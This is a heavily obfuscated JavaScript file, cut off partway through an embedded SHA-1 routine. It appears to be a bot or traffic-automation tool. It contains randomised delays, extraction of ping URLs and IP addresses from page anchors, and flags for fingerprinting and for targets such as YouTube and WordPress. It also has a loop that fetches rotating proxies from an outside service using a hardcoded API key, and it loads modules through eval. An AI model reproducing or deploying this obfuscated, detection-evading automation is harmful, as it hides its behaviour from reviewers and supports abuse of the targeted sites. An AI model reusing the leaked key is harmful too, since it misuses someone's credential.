const Q = d,
  P = b,
  O = c;

function getRandomInt(f, g) {
  const h = ceil(f);
  return floor(random() * (floor(g) - h + (0x95a + -0x6e1 * 0x1 + 0x1 * -0x278))) + h;
}

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (-0x1076 + -0x1a5 * -0xc + 0x1a3 * -0x2);
    let h = e[f];
    return h;
  }, d(b, c);
}
async function randomWait() {
  return await wait(0x2e * 0x8b + 0x3f8 + -0x2 * 0x4b5 + (-0x1 * 0x8e1 + -0xd83 + -0x14f6 * -0x2) * random()), -0x15c5 * -0x1 + 0x2 * 0xae1 + -0x2b86;
}

function randomFlush(f, g) {
  const h = f['length'];
  let i = floor(random() * h),
    j = arrs['get'](g);
  for (j || (j = new Set(), arrs['set'](g, j)); j['has'](i);)
    i = floor(random() * h);
  return j['add'](i), j['size'] === h && j['clear'](), f[i];
}

function extractLinks(f) {
  const g = /<a\s+(?:[^>]*?\s+)?href="([^"]*)"/gi;
  let h, i = [];
  for (; null !== (h = g['exec'](f));)
    h['index'] === g['lastIndex'] && g['lastIndex']++, h['forEach']((j, k) => {
      0x5af * 0x4 + 0x1cc1 + 0xa * -0x526 === k && i['push'](j);
    });
  return i;
}

function extractAnchorData(f) {
  const g = h => {
    const i = f['indexOf'](h + '=\x22');
    if (-(-0x261c + -0x1fd8 + 0x45f5) === i)
      return null;
    const j = i + h['length'] + (-0x307 + 0xd3 * -0x2b + 0x267a),
      k = f['indexOf']('\x22', j);
    return -(-0x25d8 + -0x1 * -0x3c + 0x259d) === k ? null : f['substring'](j, k);
  };
  return {
    'pingUrl': g('data-ping-' + 'url'),
    'scriptId': g('data-scrip' + 't-id'),
    'ipAddress': g('data-ip-ad' + 'dress'),
    'pingKey': g('data-ping-' + 'key')
  };
}

function isValidProxy(f) {
  return 'string' == typeof f && f['length'] > 0x447 * -0x5 + -0x19de + 0x2f44 && f['includes'](':');
}

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (-0x1076 + -0x1a5 * -0xc + 0x1a3 * -0x2);
    let h = e[f];
    if (c['alZeEx'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = -0x22ab * -0x1 + -0x252c + 0x281, r, s, t = -0x16 * -0x4f + 0x26ea + -0xd * 0x384; s = m['charAt'](t++); ~s && (r = q % (-0x5b + 0x3 * 0xa08 + 0x1 * -0x1db9) ? r * (0x12ee + -0x1 * -0x11dd + -0x248b) + s : s, q++ % (-0xd83 + 0x176e + -0x1fb * 0x5)) ? o += String['fromCharCode'](-0x15c5 * -0x1 + 0x2 * 0xae1 + -0x2a88 & r >> (-(0x5af * 0x4 + 0x1cc1 + 0x45 * -0xbf) * q & -0x261c + -0x1fd8 + 0x45fa)) : -0x307 + 0xd3 * -0x2b + 0x2678) {
          s = n['indexOf'](s);
        }
        for (let u = -0x25d8 + -0x1 * -0x3c + 0x259c, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](0x447 * -0x5 + -0x19de + 0x2f51))['slice'](-(0x1953 * -0x1 + 0x2148 + -0x7f3));
        }
        return decodeURIComponent(p);
      };
      c['fbwbqA'] = i, b = arguments, c['alZeEx'] = !![];
    }
    const j = e[0x30f + 0x14d3 + -0x17e2],
      k = f + j,
      l = b[k];
    return !l ? (h = c['fbwbqA'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}

function a() {
  const bb = [
    'WOVdPCklzbFdP8oquSk3AG',
    'zwfZEwzVCMSUBW',
    'hashed',
    'rg/en/scri',
    't\x20react,wh',
    'ts\x20日本語字幕,b',
    'W4ZcPK/dVCogW5W',
    'Aw9Ul3HTBdTXpq',
    'CMCVzw4VC2nYAq',
    'start',
    'worried-ab',
    'WOZcVmoOWROeWP7cRmkaWPZcSq',
    'Chrome/',
    '\x20(KHTML,\x20l',
    'W4hdISkzfWLtDcVcQCkR',
    'renderer',
    'C2XPy2u',
    'BMv3ugfNzq',
    'W5dcQNZdQSot',
    'W4pdMCofqLrhdLtcV8o1',
    'Bw9VBw9VlMLVla',
    'Ahr0ChmTChjVEa'
  ];
  a = function() {
    return bb;
  };
  return a();
}
async function getRandomProxy() {
  let f;
  for (; !f;) {
    const g = await fetch('https://st' + 'ratums.io/' + 'api/proxy/' + 'fetch?amt=' + '1&premium=' + 'yes&key=68' + 'dd383d6a62' + 'fb45684a02' + '1121959d15' + '06f8270066' + 'c62adc84aa' + 'a256e2b0e2' + '09')['then'](h => h['text']());
    isValidProxy(g) && (f = g), log('Didn\x27t\x20wor' + 'k:\x20' + g), await wait(0x1953 * -0x1 + 0x2148 + -0x40d);
  }
  return f;
}
const flags = {
    'ActivateBrowser': 0x1,
    'RPL2_MDM2': 0x1,
    'RPL2_WP': 0x1,
    'RPL2_RPRT': 0x1,
    'RPL2_YT': 0x1,
    'doOUJS': 0x1,
    'doGF': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1,
    'doUseProxy': 0x1
  },
  sha1 = ((() => {
    var f, g, h, i, j, k, l, m, n = 'object' == typeof window ? window : {},
      o = !n['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
    o && (n = global), f = ('0123456789' + 'abcdef')['split'](''), g = [-(0x1408113a + 0x88769292 + -0x1c7ea3cc),
      0x167bf * -0x1 + 0x13 * 0xb2ccd + -0x14bade * 0x4,
      0xc * 0x757 + -0xc213 + -0xe9ff * -0x1,
      0x5 * -0x512 + 0x1cc2 + -0x2e8
    ], h = [-0x222d + -0x1 * -0x1cca + 0x3d * 0x17, -0xcb8 + -0x22df * -0x1 + 0x41 * -0x57,
      0x10f1 * -0x1 + -0x2610 + 0x3709, -0x1e2b + -0x19 * -0xb8 + 0xc33
    ], i = [
      'hex',
      'array',
      'digest',
      'arrayBuffe' + 'r'
    ], j = [], k = function(r) {
      return function(s) {
        return new p(-0x3e * 0x53 + -0x1 * 0xf3f + 0x235a)['update'](s)[r]();
      };
    }, l = function() {
      var r, s, u = k('hex');
      for (o && (u = m(u)), u['create'] = function() {
          return new p();
        }, u['update'] = function(v) {
          return u['create']()['update'](v);
        }, r = -0xb * -0xe5 + 0x1d8f + -0x2766; r < i['length']; ++r)
        s = i[r], u[s] = k(s);
      return u;
    }, m = function(r) {
      var s = eval('require(\'crypto\');'),
        t = eval('require(\'buffer\')[\'Buffer\'];'),
        u = function(v) {
          if ('string' == typeof v)
            return s['createHash']('sha1')['update'](v, 'utf8')['digest']('hex');
          if (v['constructo' + 'r'] === ArrayBuffer)
            v = new Uint8Array(v);
          else {
            if (void(-0x11 * -0x18d + -0x1dae + 0x351) === v['length'])
              return r(v);
          }
          return s['createHash']('sha1')['update'](new t(v))['digest']('hex');
        };
      return u;
    };
    class p {
      constructor(r) {
          const L = d;
          r ? (j[-0x11c4 + 0x1d27 + -0x1 * 0xb63] = j[0xd5 * 0x2d + 0x1 * 0x1d2 + -0x2733] = j[-0x2da * -0xc + 0x28c * -0x4 + -0x1 * 0x1807] = j[-0x1 * 0xdbf + 0x21c1 + -0x1400] = j[-0x6c3 + -0x1 * -0x1ba5 + 0x3 * -0x6f5] = j[0x26c7 + 0x19a0 + -0x4063] = j[-0x1 * 0x2f9 + -0x1325 + 0x1623] = j[-0x2641 + 0x425 * 0x7 + 0x944] = j[0x1d94 + 0x1671 + 0xa * -0x533] = j[0xefa + -0x17 * 0x11e + -0x2 * -0x560] = j[0x235 * 0x2 + -0x1281 + 0x10 * 0xe2] = j[0x1a5 * 0xb + -0x1b * 0x4f + -0x9b8] = j[0xb57 * 0x1 + 0x2612 + -0x315e] = j[0x3b * 0x47 + 0x23ba + 0x1159 * -0x3] = j[-0x3cd + -0x2488 + 0xd76 * 0x3] = j[0x131b + -0x132d + 0x20] = j[-0x12da * -0x2 + 0x1f3b + 0x2270 * -0x2] = 0x12f * 0x14 + 0x4 * 0x650 + 0xca * -0x3e, this['blocks'] = j) : this['blocks'] = [-0x22 * 0x19 + -0x677 * 0x1 + 0x9c9,
            0x1eae + -0x4 * -0x324 + -0x2b3e, -0xb05 + -0xb84 + 0x1689, -0xdf * 0x29 + 0x1b31 + 0x886, -0x3 * 0x712 + 0x138 + 0x355 * 0x6, -0x4e1 * 0x3 + 0x2 * 0x464 + 0x5db, -0x2641 + 0x2 * 0x11c9 + 0x2af, -0x4db * 0x8 + -0x628 * -0x5 + 0x810,
            0x21bc + 0x1 * 0x156c + -0x3728, -0xa4 * 0x18 + 0x1167 + 0x207 * -0x1, -0x153b + -0x21d6 + -0x6f * -0x7f, -0x6f * -0x3a + -0x70 * 0x6 + -0x1686,
            0x121d + -0x21d * -0x1 + 0x3 * -0x6be,
            0x2f5 + 0xf1 * 0x29 + 0x18a * -0x1b, -0x2683 + 0xd * 0x293 + 0x2 * 0x286,
            0x1d23 + -0x1 * 0x155d + -0x7c6, -0xc10 + 0x105 * 0x13 + -0x74f * 0x1
          ], this['h0'] = -0x87b257f4 + -0x17d * -0x2f6f09 + -0x22d850 * -0x4d5, this['h1'] = 0xf254fcb0 + 0x45 * -0x3c4a9d1 + 0x1017a742e, this['h2'] = 0xb93ee2f * -0x4 + -0x5146e5f2 * 0x2 + 0x16998619e, this['h3'] = 0x6bdb * 0x3d83 + 0x661825 + -0xa1e23c * 0x10, this['h4'] = 0xc0287e1a + -0x281aa5 * 0x116 + 0x24f6dc * 0x147, this['block'] = this[L(0x9)] = this['bytes'] = this['hBytes'] = -0xf7 * 0xd + -0x207 * -0x5 + -0x9a * -0x4, this['finalized'] = this['hashed'] = 0x2539 * -0x1 + -0x2db + 0x3 * 0xd5c, this['first'] = 0x663 + -0xc * -0x29 + -0x84e;
        }
        ['update'](u) {
          const N = b,
            M = d;
          var v, w, x, y, z, A;
          if (!this['finalized']) {
            for ((v = 'string' != typeof u) && u['constructo' + 'r'] === n['ArrayBuffe' + 'r'] && (u = new Uint8Array(u)), x = -0x201 * 0xa + 0x25f9 * 0x1 + -0x11ef, z = u['length'] || 0x886 * 0x3 + 0x250a + -0x3e9c, A = this['blocks']; x < z;) {
              if (this['hashed'] && (this[M(0x2)] = -0x2 * -0xc05 + -0x8c3 * 0x2 + -0x684, A[0x1faf + 0x8 * 0x2ec + -0x370f] = this['block'], A[-0x97 * -0x5 + -0x1 * 0x8ad + -0xd * -0x72] = A[-0x5c9 * -0x5 + -0x1 * -0x1ab7 + -0x37a3] = A[-0x1 * -0x2579 + 0x1dfd + -0x4374] = A[-0x3 * 0x119 + -0x135 * 0x1f + 0x28b9] = A[-0x1ee + -0x21b8 + 0x23aa] = A[0x25d5 + 0x45 * -0x2b + -0x1a39] = A[0x10d9 + -0x1353 + -0x5 * -0x80] = A[-0x6 * -0x3d1 + -0x7 * -0x3b + -0x4 * 0x61f] = A[-0xbf * 0xb + -0x21cc + 0x2a09] = A[-0x1767 + 0xaad * 0x3 + -0x897] = A[0x146b + -0x177b + 0x31a] = A[0x1d41 + -0x3c4 + -0x1972] = A[-0xcb * 0x2 + 0x835 + -0x693] = A[0x1 * 0x698 + 0x49f + 0x1 * -0xb2a] = A[0x14b * 0x2 + 0xadf + -0xd67] = A[0x25f * 0x9 + -0x1883 + 0x33b] = -0x1eac + -0x1cfc * 0x1 + 0xa6 * 0x5c), v) {
                for (y = this['start']; x < z && y < 0x6ea + -0xc5 * -0x2a + -0x3e6 * 0xa; ++x)
                  A[y >> -0x7a1 + 0x9 * 0x15f + -0x4b4] |= u[x] << h[0x2 * -0xa64 + -0x1 * -0xe6b + 0x60 * 0x11 & y++];
              } else {
                for (y = this['start']; x < z && y < -0x1f15 + -0x2604 + 0x1b1 * 0x29; ++x)
                  (w = u['charCodeAt'](x)) < -0x1 * 0x1bb5 + 0x1 * 0x756 + 0x14df ? A[y >> -0x2ef * -0x3 + -0x53 * -0x53 + -0x23b4] |= w << h[-0x1e7 + -0x25 * -0x5 + 0x131 & y++] : w < 0x186c * 0x1 + 0x40c * -0x2 + -0x854 ? (A[y >> 0x2 * 0x12df + -0x1d9f * 0x1 + -0x1f * 0x43] |= (0x2ad * 0x7 + -0x7aa + -0xa51 | w >> 0x5 * -0x1f3 + -0x64 * 0x46 + 0x251d * 0x1) << h[-0x2ec + -0x2f5 * -0x3 + -0x5f0 & y++], A[y >> 0x62 * -0x14 + -0x1b51 + 0xc7 * 0x2d] |= (-0x8ec + -0x2c2 + 0xc2e * 0x1 | 0x19f1 * -0x1 + 0x1080 + 0x26c * 0x4 & w) << h[0x12d + 0x109d * -0x1 + -0x23 * -0x71 & y++]) : w < 0x2b * -0x254 + -0x85da + -0x59fe * -0x5 || w >= -0x18b2c + 0x1b6db + -0x9 * -0x1409 ? (A[y >> 0x24ed + -0xeb * -0x21 + -0x1 * 0x4336] |= (-0x313 * -0x3 + 0x4 * 0x79a + -0x26c1 | w >> -0x2019 + 0x1c9e + 0x15 * 0x2b) << h[0x3ce * 0x1 + 0x6f * -0x25 + 0xc40 & y++], A[y >> 0x280 + 0x1201 * -0x1 + -0x13 * -0xd1] |= (-0x13f9 + 0x5d1 * 0x6 + -0xe6d | w >> 0x4 * -0x641 + -0xf45 + 0x284f & -0x1023 + 0xf * 0x179 + -0x5b5) << h[0x1153 * -0x1 + 0x109d * 0x2 + -0xfe4 & y++], A[y >> 0x137d + -0x1ad1 + 0x756 * 0x1] |= (0x1 * -0x805 + -0x5bd * 0x5 + -0x362 * -0xb | -0xbbe + -0x22b7 + 0x1ab * 0x1c & w) << h[-0x25 * -0xb5 + 0x1 * -0x19f5 + -0x31 & y++]) : (w = 0x1040 * -0x13 + 0x11e20 + 0x116a0 + ((0x9e3 + 0xa49 + -0x102d & w) << -0x1044 + -0x144f * -0x1 + 0x401 * -0x1 | -0xd99 * 0x2 + 0xcb * 0x17 + 0xcf4 & u['charCodeAt'](++x)), A[y >> -0x3 * 0x74b + 0x978 + 0xc6b] |= (0xe45 + -0x5 * -0x31 + -0xe4a | w >> 0x16da + -0x102e + -0x69a) << h[-0x2 * -0xd3a + -0x3d * 0x89 + 0x634 & y++], A[y >> -0x1d * 0xa + 0x1198 + 0x2be * -0x6] |= (-0x4d5 * 0x1 + 0x236d + -0x1e18 | w >> -0x2de * -0x7 + 0x1a48 + 0x2e4e * -0x1 & -0x1863 + -0x298 + -0x22 * -0xcd) << h[0x14e8 + 0x1 * -0x23d5 + 0xef0 & y++], A[y >> 0x114e + -0x43a * 0x1 + 0xd12 * -0x1] |= (0x2d4 + -0x6d3 + -0x1 * -0x47f | w >> 0x1c9 * -0xd + 0x2389 + 0x4b * -0x2a & -0xe5c + -0xf5b * -0x2 + 0x1f * -0x85) << h[-0x58f * 0x1 + 0x15f6 + -0x1064 & y++], A[y >> -0x217f + -0x3fd * -0x7 + 0x37 * 0x1a] |= (0x1 * -0x1704 + -0x1 * 0x23f3 + -0x493 * -0xd | -0x16e * 0x2 + 0x546 + 0x6f * -0x5 & w) << h[0x12ab + -0x1e64 + 0x2 * 0x5de & y++]);
              }
              this['lastByteIn' + 'dex'] = y, this['bytes'] += y - this['start'], y >= -0x1219 + 0x121 + 0x1138 ? (this['block'] = A[-0xe04 + -0xa63 + 0x1877], this['start'] = y - (-0xc29 + 0x1 * 0xd5b + 0xb * -0x16), this['hash'](), this['hashed'] = 0x24b * -0x1 + -0x1c8e + -0x1eda * -0x1) : this[N(0x12, '#qO1')] = y;
            }
            return this['bytes'] > 0x101398597 + -0x1aaab8627 + 0x1a972008f && (this['hBytes'] += this['bytes'] / (0x181262ca8 + 0xc87b * -0x141bc + 0x1477e172 * 0x6) << 0x1 * -0x5c6 + -0xe * 0xbb + 0x1000, this['bytes'] = this['bytes'] % (0x88c191dc + -0x1a * 0x67d16ce + 0x10 * 0x11ff2bf1)), this;
          }
        }
        ['finalize']() {
          if (!this['finalized']) {
            this['finalized'] = 0x20bf + 0x1 * 0x227f + -0x433d;
            var r = this['blocks'],
              s = this['lastByteIn' + 'dex'];
            r[0x18ef + -0x101e + -0x8c1] = this['block'], r[s >> 0x1b * -0xfd + -0x2 * -0xbec + 0xf3 * 0x3] |= g[-0x7 * 0xf9 + -0x8 * 0x286 + 0x1b02 & s], this['block'] = r[-0xa85 * 0x1 + -0x1 * 0xe7 + -0x2a * -0x46], s >= -0x115c + -0x1 * 0x1ada + -0x2f * -0xf2 && (this['hashed'] || this['hash'](), r[0xea2 + -0xe14 + -0x8e] = this['block'], r[-0x1f5 * 0xf + 0x13a0 + -0x1 * -0x9cb] = r[0x5ae * -0x1 + 0x1242 + -0x1 * 0xc93] = r[0x1a3 * 0x2 + 0x677 * -0x1 + 0x333] = r[-0x1fe7 * -0x1 + 0x1c76 + -0x3c5a] = r[-0x12b3 + -0x4 * 0x30a + 0x1edf] = r[0x26e0 + -0x3 * 0x540 + 0x23 * -0xa9] = r[0x1031 + 0x1c19 * -0x1 + 0xbee] = r[0x1b28 + -0xa03 + -0x1 * 0x111e] = r[-0x11 * -0xe2 + -0x989 + -0x571] = r[0x26 * -0x29 + 0x1e7 * -0x8 + 0x1557] = r[0x26 * -0xca + 0x13 * 0xbb + 0x1025] = r[0x174 * 0x8 + -0x1022 + -0xe9 * -0x5] = r[0x1f60 + 0xae5 * -0x2 + 0x1 * -0x98a] = r[0x35 * 0xb5 + -0x2075 + 0x1f * -0x29] = r[0x4 * 0x779 + 0xf * 0x72 + -0x2484] = r[-0x4 * 0x279 + 0x17b4 + -0x1 * 0xdc1] = 0x10 * -0x243 + -0x309 + -0x3 * -0xd13), r[0x4 * 0x601 + 0x2201 + -0x545 * 0xb] = this['hBytes'] << 0x1692 + 0x92c * -0x4 + 0xe21 * 0x1 | this['bytes'] >>> 0x738 + -0xb6f * 0x1 + 0x454, r[-0x22c0 + 0x740 + 0x1b8f] = this['bytes'] << 0x5 * -0x47 + -0x195d + 0x1ac3, this['hash']();
          }
        }
        ['hash']() {
          var u, v, w = this['h0'],
            x = this['h1'],
            y = this['h2'],
            z = this['h3'],
            A = this['h4'],
            B = this['blocks'];
          for (u = -0xce2 + -0x9b3 * -0x1 + -0x1 * -0x33f; u < 0x3 * -0xcd9 + 0xf1 * 0x2 + 0x277 * 0xf; ++u)
            v = B[u - (0x6e1 + 0x1696 + -0x1d74)] ^ B[u - (0x9 * 0x36d + -0x20d7 + -0x57 * -0x6)] ^ B[u - (0x1bfa + -0x1 * 0x7f7 + -0x1 * 0x13f5)] ^ B[u - (0xcb * -0x1b + 0x6ef * 0x3 + 0xac)], B[u] = v << -0x1 * -0x17bf + 0x212a + -0xe3a * 0x4 | v >>> 0xf * 0x7f + 0x18ed + 0x41 * -0x7f;
          for (u = 0x1 * -0x1ac8 + -0x1c * -0xa7 + 0x884; u < 0x1f48 + 0x15 * -0xbe + -0x7cf * 0x2; u += -0x1c16 + 0x1d03 + -0xe8)
            w = (v = (x = (v = (y = (v = (z = (v = (A = (v = w << -0x1183 * -0x1 + 0x7be * -0x3 + 0x5bc | w >>> -0xe48 * 0x1 + 0x1d38 + -0xed5) + (x & y | ~x & z) + A + (-0x6f0131 * -0x7 + 0x13a87de7 * 0x8 + 0x6 * -0xba1bfa9) + B[u] << 0x326 * -0x5 + 0x4cd * 0x3 + 0x157) << -0x15b3 * 0x1 + -0xc0e + -0x5a1 * -0x6 | A >>> -0x61 * 0x4a + 0xb1f * 0x2 + 0x1 * 0x5e7) + (w & (x = x << 0xf86 * -0x1 + 0x92 * -0x2b + 0xc2 * 0x35 | x >>> -0x6a3 * 0x1 + 0x248 * 0x4 + 0x7f * -0x5) | ~w & y) + z + (0x1 * -0xaf7c81e4 + -0xa855ec21 + 0x1 * 0x1b254e79e) + B[u + (0xac + 0x34 * 0x2e + -0xa03)] << 0x18ee * 0x1 + -0x1 * -0x252a + -0x3e18) << 0x1 * 0x17a3 + -0x4ef + -0x12af | z >>> 0x1a70 * -0x1 + -0x12fd * 0x1 + 0x2d88) + (A & (w = w << 0x11 * -0xf9 + 0x1f1f + -0xe78 | w >>> 0x18b5 + 0x1453 + 0x1683 * -0x2) | ~A & x) + y + (0x7eb5e7bc * -0x1 + 0xf * 0x70ffff + 0xd2996164) + B[u + (0x65 + 0x269e + -0x2701)] << -0x5 * -0x653 + -0x312 + -0x1c8d * 0x1) << -0x1be4 + 0x145d + 0xe * 0x8a | y >>> -0x8e4 + 0x313 * -0x9 + 0x24aa) + (z & (A = A << 0x2346 + -0xee5 + -0x1443 | A >>> 0x1e5c + -0x1159 + -0xd01) | ~z & w) + x + (-0xfa * -0x4abd0b + 0x4 * -0x10d25f16 + 0x54cf5933) + B[u + (0x1abd + -0x2164 + 0x6aa * 0x1)] << -0x1fb * 0x5 + 0x864 + -0x1 * -0x183) << -0x1 * -0x25bd + 0x23 * -0x7 + -0x24c3 | x >>> 0x511 * -0x5 + 0x1617 + 0x1 * 0x359) + (y & (z = z << 0xb * -0x202 + 0x1310 + 0x324 | z >>> 0x1d33 + 0x211a + -0x3e4b) | ~y & A) + w + (0x192fa9df * -0x1 + -0x3b * -0x93b07e + -0x6c236 * -0xc15) + B[u + (0x12a * 0x7 + 0xc47 + -0xd1 * 0x19)] << -0x2 * 0xdf0 + 0x21c1 * -0x1 + 0x3da1, y = y << -0x60 + -0xe96 + -0x2 * -0x78a | y >>> -0xcf2 * 0x1 + 0x1 * -0x192f + 0x1 * 0x2623;
          for (; u < 0x1cea * -0x1 + -0x2f1 * 0x9 + 0x378b; u += -0x1610 + -0x7f7 * -0x4 + -0x9c7)
            w = (v = (x = (v = (y = (v = (z = (v = (A = (v = w << 0x109b + -0x6 * 0x15b + -0x874 * 0x1 | w >>> 0x148f + -0x17d + 0x1 * -0x12f7) + (x ^ y ^ z) + A + (0x645a01 * -0x213 + -0x1523 * 0x33259 + -0x1 * -0x18291cadf) + B[u] << 0x55 * 0x8 + -0x198a + 0x16e2) << -0x15b * 0x2 + -0x1 * 0x1270 + 0x152b * 0x1 | A >>> 0x223 + 0x12f2 + -0x14fa) + (w ^ (x = x << 0xfe + -0x26b6 * 0x1 + 0x25d6 | x >>> -0x23cc + 0xb67 + 0x1867) ^ y) + z + (0xd1c5b68c + -0xdad16f0b + 0x77e5a420) + B[u + (-0x13 * -0x1af + 0x1bb * -0x7 + -0x13df)] << -0xa * -0x205 + 0x1481 * 0x1 + 0x17 * -0x1c5) << 0x11f2 * 0x2 + -0x28 * -0x10 + 0xb * -0x37d | z >>> 0x309 + 0x4 * -0x71f + 0x198e * 0x1) + (A ^ (w = w << -0xd * 0x21a + 0x25c0 + -0xa50 | w >>> -0x1c7b + -0x164b * -0x1 + 0x632 * 0x1) ^ x) + y + (-0x8e97 * 0x2548 + -0x1d * 0x283e51d + -0x664766b1 * -0x2) + B[u + (0x1bef + -0x1b16 + -0xd7)] << -0x962 * 0x1 + 0xd7 * -0x1e + -0x8a5 * -0x4) << 0x4 * 0x35 + -0x1419 + -0x2 * -0x9a5 | y >>> 0x21b7 + 0x1e52 + -0x31 * 0x14e) + (z ^ (A = A << -0x1590 + 0x185c + 0xe * -0x31 | A >>> -0x73c + -0xc3 * -0x32 + 0x1c * -0x11a) ^ w) + x + (-0x1c703 * 0x5777 + 0x5d1e15a0 + 0xad315d66) + B[u + (-0x7 * 0x222 + -0x3d7 + -0x2 * -0x964)] << -0x11 * 0x62 + -0x236 + 0x8b8) << 0x6 * -0x36d + 0x1 * 0x12bf + 0x1d4 | x >>> 0x2 * -0xb21 + -0x7 * -0x4e4 + -0x1 * 0xbdf) + (y ^ (z = z << -0x31 * -0xb9 + 0x1 * -0x1da + -0x2171 | z >>> 0x6ea * 0x4 + -0x1da5 + 0x1ff) ^ A) + w + (0x4 * -0x2b75c1f4 + 0x904 * 0x86f8d + 0xd0a3403d) + B[u + (-0x56 * 0x17 + -0x1f8f + 0x274d)] << 0x26c8 + 0x13f * 0x17 + 0xd7d * -0x5, y = y << -0x152e + -0x22c9 + -0x125 * -0x31 | y >>> 0x101 * 0xd + -0x1fa9 * -0x1 + -0x2cb4;
          for (; u < 0x2244 + 0x127e + -0x5d6 * 0x9; u += 0x1 * 0x1ae1 + -0x1105 + -0x9d7)
            w = (v = (x = (v = (y = (v = (z = (v = (A = (v = w << 0x1f58 + 0x161 * -0x7 + -0x1 * 0x15ac | w >>> -0xfd * -0x17 + -0x17 * 0x133 + 0x4f5) + (x & y | x & z | y & z) + A - (-0xaa7c0c4b + -0x29ad309 * -0x55 + 0x1efc1eb9 * 0x2) + B[u] << 0x25c7 + -0x2 * -0x293 + 0x2aed * -0x1) << 0x1 * 0x2560 + -0x1842 + -0xd19 | A >>> -0x22ba + -0x55 * -0x67 + 0xa2 * 0x1) + (w & (x = x << 0x1 * -0x2079 + 0xa0b + -0xd * -0x1bc | x >>> -0x20bb + 0x32 * 0xd + -0x35b * -0x9) | w & y | x & y) + z - (-0x2b7c338 * 0x2d + 0x45dd586f + 0xa5543b8d) + B[u + (-0xb56 + -0xa32 + 0x1589)] << -0xb0b * -0x1 + 0x183 * 0x7 + -0x8 * 0x2b4) << -0x32 * 0x95 + -0x51b + 0xd * 0x2a2 | z >>> 0x189d * 0x1 + -0x11 * -0x179 + 0x318b * -0x1) + (A & (w = w << -0x9d4 * 0x1 + -0x347 * 0x6 + 0x1d9c | w >>> 0x1 * 0xb4c + -0x25e1 * 0x1 + 0x1a97) | A & x | w & x) + y - (0x25 * -0x1e22cbb + -0x496a007f + 0xfffebaaa) + B[u + (-0xf35 * 0x2 + 0x6be + 0x17ae)] << 0x19 * 0x106 + -0x1463 + -0x533) << -0x1 * 0x231a + 0x3a5 + -0x33 * -0x9e | y >>> -0x745 * 0x1 + -0x14a6 + 0x1c06) + (z & (A = A << -0x703 + -0x3b2 + 0xad3 | A >>> 0x1e41 + 0x8 * -0x3ad + -0xd7) | z & w | A & w) + x - (0xa1cff185 + -0x9c62bf2b + 0x6b7710ca) + B[u + (-0x1 * 0x12b2 + -0x1a82 + 0x2d37)] << 0x918 + -0x8d7 + 0x1 * -0x41) << -0x19 * -0xa7 + -0x521 + -0xb29 | x >>> -0x135d + -0x1d15 + -0x1 * -0x308d) + (y & (z = z << -0x304 + 0x2145 + -0x1e23 | z >>> 0x4 * -0x49f + 0x1ee5 * 0x1 + -0xc67 * 0x1) | y & A | z & A) + w - (0xa438bbd + 0x1 * -0xae53d995 + 0x679 * 0x2ac9dc) + B[u + (0x5fc + 0x1048 + 0x59 * -0x40)] << -0x5f * -0x26 + 0x184d + -0x2667, y = y << -0x4ad * 0x5 + -0x1a09 + 0x3188 | y >>> 0x65e + -0x70 * 0x1 + -0x2 * 0x2f6;
          for (; u < -0xb6 * -0x1 + -0x11e5 + 0x117f; u += 0x3 * 0x603 + 0x1b56 * 0x1 + 0x3 * -0xf1e)
            w = (v = (x = (v = (y = (v = (z = (v = (A = (v = w << -0x8 * 0x4f + -0xabb * -0x3 + -0x1db4 | w >>> -0xf1 * 0x1 + -0x1c9 * -0x7 + -0x3 * 0x3d1) + (x ^ y ^ z) + A - (-0x3619057 * 0x11 + 0x5aff4c47 + 0xe9d79f * 0x16) + B[u] << -0xd * -0x275 + -0x3a * -0x2b + 0xde5 * -0x3) << 0x24c4 + -0x18fe + -0xbc1 | A >>> -0xf11 + -0x1c2c + 0x15ac * 0x2) + (w ^ (x = x << -0x35 * -0x5e + 0x202 * -0xf + -0x2 * -0x563 | x >>> 0x1c25 + 0xc79 * 0x1 + -0x289c) ^ y) + z - (-0x1f48a900 + -0x3cacb4e2 + 0x91929c0c) + B[u + (0x14ae + 0x2684 + 0x3b31 * -0x1)] << -0x1 * -0x1973 + 0x210e * -0x1 + 0x79b) << 0x1379 * 0x1 + 0x23ef + -0x3763 | z >>> 0x6c * -0x29 + 0x33 * 0x57 + 0x12) + (A ^ (w = w << -0x54c + -0x3f5 * -0x5 + -0xe5f | w >>> -0x1 * 0x260f + -0x2b * 0xa2 + 0x4147 * 0x1) ^ x) + y - (0x3b7 * 0xb6f79 + -0x2287c6bf + 0x1aa0e6 * 0x1b7) + B[u + (0x4d0 * 0x6 + 0x464 + -0x2142)] << 0x3 * -0x44b + -0x1687 * 0x1 + -0x2c * -0xce) << 0x1499 + 0x2 * -0xcf7 + 0x55a | y >>> 0x1485 + 0x15f8 + -0x2a62) + (z ^ (A = A << -0x101a + 0xbca + 0x12 * 0x3f | A >>> -0x11a * -0xe + -0x2 * 0x717 + 0x2 * -0x9e) ^ w) + x - (-0x20 * 0x15f625 + -0x3f0aab81 + -0x7766ae4b * -0x1) + B[u + (-0xc3d + -0x95c + 0x6 * 0x39a)] << -0x1 * -0x676 + 0x1754 + 0x7b * -0x3e) << -0xc6 * 0x23 + -0x1464 + 0x37 * 0xdd | x >>> -0x4 * 0x44f + -0x2 * -0xc1a + 0x1 * -0x6dd) + (y ^ (z = z << 0x187 + -0x49 * 0x59 + 0x76 * 0x34 | z >>> -0x1002 + -0x3d5 + 0x13d9) ^ A) + w - (0x182f1694 + 0x319d * 0x70f5 + 0x789fc55) + B[u + (0x3ee * -0x1 + -0x45d + 0x84f)] << 0x1c5 * 0x11 + -0x1d * -0xbf + -0x33b8, y = y << -0x1 * -0x1eb6 + 0x22bb + 0x1 * -0x4153 | y >>> -0x241e + 0x8b3 + 0x19d * 0x11;
          this['h0'] = this['h0'] + w << -0x2614 + -0x11bf + 0x1cd * 0x1f, this['h1'] = this['h1'] + x << 0xb * -0x31 + 0x11e5 + 0xfca * -0x1, this['h2'] = this['h2'] + y << 0x1206 + 0x1 * -0x158e + 0x388, this['h3'] = this['h3'] + z << 0x2027 + 0x59 * -0x6f + 0x4 * 0x19c, this['h4'] = this['h4'] + A << 0x19f4 + -0x10 * -0x182 + -0x2 * 0x190a;
        }
        ['hex']() {
